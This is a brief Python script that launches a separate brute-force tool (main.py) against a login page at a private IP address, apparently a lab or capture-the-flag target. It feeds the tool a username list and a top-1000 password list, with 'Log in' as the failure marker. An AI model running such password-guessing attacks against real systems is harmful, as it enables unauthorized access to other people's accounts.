import subprocess

url = "http://10.129.166.245"
userfile = "usernames_300.txt"
passfile = "10-million-password-list-top-1000.txt"
flag = "Log in"

comando = [
    "C:/Users/a914686/AppData/Local/Programs/Python/Python312/python.exe",
    "main.py",
    url,
    "-U", userfile,
    "-P", passfile,
    "-f", flag
]

subprocess.run(comando)
